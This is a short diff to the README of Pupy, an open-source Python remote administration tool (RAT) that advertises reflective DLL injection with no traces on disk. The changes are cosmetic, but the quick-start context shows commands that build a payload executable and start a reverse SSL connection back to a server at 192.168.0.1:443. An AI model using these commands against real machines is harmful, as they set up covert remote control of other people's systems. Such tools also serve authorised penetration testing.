@@ -1,4 +1,4 @@
-# pupy
+# Pupy
 Pupy is an opensource RAT (Remote Administration Tool) written in Python. Pupy uses reflective dll injection and leaves no traces on disk.
 
 ## Features :
@@ -30,9 +30,9 @@ Pupy is an opensource RAT (Remote Administration Tool) written in Python. Pupy u
 - interactive python shell
 
 ##Quick start
-In these examples the server is running on a linux host (tested on kali linux) and it's IP address is 192.168.0.1
+In these examples the server is running on a linux host (tested on kali linux) and it's IP address is 192.168.0.1  
 The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac OS X 10.10.5) 
-### generate a payload
+### generate/run a payload
 #### for Windows
 ```bash
 ./genpayload.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
@@ -49,11 +49,10 @@ easy_install rpyc #(or manually copy it if you are not admin)
 python reverse_ssl.py 192.168.0.1:443
 ```
 
-### start the server
+### having fun
 1. eventually edit pupy.conf to change the bind address / port
-2. start pupysh.py
+2. start the pupy server :
 ```bash
 ./pupysh.py
 ```
 3. type "clients" to display connected clients
-
